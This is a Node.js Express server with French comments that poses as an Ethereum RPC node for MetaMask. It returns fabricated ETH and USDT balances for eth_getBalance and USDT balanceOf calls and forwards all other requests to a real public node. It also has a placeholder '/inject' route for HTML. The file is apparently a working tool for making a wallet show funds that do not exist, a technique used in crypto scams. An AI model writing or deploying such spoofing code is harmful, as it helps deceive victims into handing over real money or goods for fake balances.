const express = require('express');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Faux solde : 10 ETH (en hexadécimal : 0x8AC7230489E80000)
const FAKE_ETH_BALANCE = '0x8AC7230489E80000'; 
const FAKE_USDT_BALANCE = '0x' + (1000n * 10n ** 6n).toString(16).padStart(64, '0');
const USDT_CONTRACT = '0xdac17f958d2ee523a2206206994597c13d831ec7';
const REAL_RPC = 'https://ethereum-rpc.publicnode.com';

app.get('/inject', (req, res) => {
  // (Garde ton ancien code HTML ici, il marche déjà)
});

app.post('/', async (req, res) => {
  const { method, params, id } = req.body;
  console.log(`[RPC] ${method}`);

  // 1. Répondre au test de MetaMask
  if (method === 'eth_chainId') return res.json({ jsonrpc: '2.0', id, result: '0x1' });
  if (method === 'net_version') return res.json({ jsonrpc: '2.0', id, result: '1' });

  // 2. Intercepter le solde NATIF (ETH)
  if (method === 'eth_getBalance') {
    console.log('>>> Faux solde ETH renvoyé !');
    return res.json({ jsonrpc: '2.0', id, result: FAKE_ETH_BALANCE });
  }

  // 3. Intercepter le solde ERC20 (USDT)
  if (method === 'eth_call') {
    const call = params[0];
    if (call.to && call.to.toLowerCase() === USDT_CONTRACT && call.data && call.data.startsWith('0x70a08231')) {
      console.log('>>> Faux solde USDT renvoyé !');
      return res.json({ jsonrpc: '2.0', id, result: FAKE_USDT_BALANCE });
    }
  }

  // 4. Relayer tout le reste au vrai réseau Ethereum
  try {
    const response = await fetch(REAL_RPC, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(req.body)
    });
    const data = await response.json();
    return res.json(data);
  } catch (e) {
    return res.status(500).json({ error: e.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Serveur en écoute sur le port ${PORT}`);
});
